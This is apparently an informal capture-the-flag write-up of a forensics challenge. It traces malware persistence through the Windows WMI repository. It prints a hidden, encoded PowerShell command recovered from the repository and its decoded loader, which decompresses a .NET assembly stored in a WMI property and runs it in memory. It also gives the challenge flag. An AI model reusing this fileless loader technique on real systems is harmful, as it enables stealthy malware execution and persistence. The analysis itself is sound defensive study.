# Informal Writeup
```bash
$ strings repo/OBJECTS.DATA | grep powershell
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBNAGUAbQBvAHIAeQBBAHIAcgBhAHkARABlAHYAaQBjAGUAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAUAByAG8AcABlAHIAdAB5ACcAXQAuAFYAYQBsAHUAZQA7AHMAdgAgAG8AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQApADsAcwB2ACAAZAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAaQBsAGUAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAOwBzAHYAIABiACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AKAAxADAAMgA0ACkAKQA7AHMAdgAgAHIAIAAoAGcAdgAgAGQAKQAuAFYAYQBsAHUAZQAuAFIAZQBhAGQAKAAoAGcAdgAgAGIAKQAuAFYAYQBsAHUAZQAsADAALAAxADAAMgA0ACkAOwB3AGgAaQBsAGUAKAAoAGcAdgAgAHIAKQAuAFYAYQBsAHUAZQAgAC0AZwB0ACAAMAApAHsAKABnAHYAIABvACkALgBWAGEAbAB1AGUALgBXAHIAaQB0AGUAKAAoAGcAdgAgAGIAKQAuAFYAYQBsAHUAZQAsADAALAAoAGcAdgAgAHIAKQAuAFYAYQBsAHUAZQApADsAcwB2ACAAcgAgACgAZwB2ACAAZAApAC4AVgBhAGwAdQBlAC4AUgBlAGEAZAAoACgAZwB2ACAAYgApAC4AVgBhAGwAdQBlACwAMAAsADEAMAAyADQAKQA7AH0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAoAGcAdgAgAG8AKQAuAFYAYQBsAHUAZQAuAFQAbwBBAHIAcgBhAHkAKAApACkALgBFAG4AdAByAHkAUABvAGkAbgB0AC4ASQBuAHYAbwBrAGUAKAAwACwAQAAoACwAWwBzAHQAcgBpAG4AZwBbAF0AXQBAACgAKQApACkAfABPAHUAdAAtAE4AdQBsAGwA
$ echo 'base64 strings' | base64 -d; echo
$file = ([WmiClass]'ROOT\cimv2:Win32_MemoryArrayDevice').Properties['Property'].Value;sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
$ strings repo/* | grep -C 5 Win32_MemoryArrayDevice
Override
GroupComponent
__thisNAMESPACE
__NAMESPACE
S_1_5_21_4058070148_2814875178_2081404498_1001
Win32_MemoryArrayDevice
Property
string
[LOOOOOOOONG BASE64]
```

Then you just toss that base64 into the powershell script in place of the `$file` variable, and then remove the reflection line to be `Write-Host (gv o).Value.ToArray()`, realize that these are the bytes to some portable executable, use CyberChef or Python to turn them into the executable, recognize that it's a .NET compiled, so you can just decompile with [dnSpy](https://github.com/dnSpyEx/dnSpy).

Someone should update [flare-wmi](https://github.com/mandiant/flare-wmi).

**FLAG**: `HTB{1_th0ught_WM1_w4s_just_4_M4N4g3m3nt_T00l}`
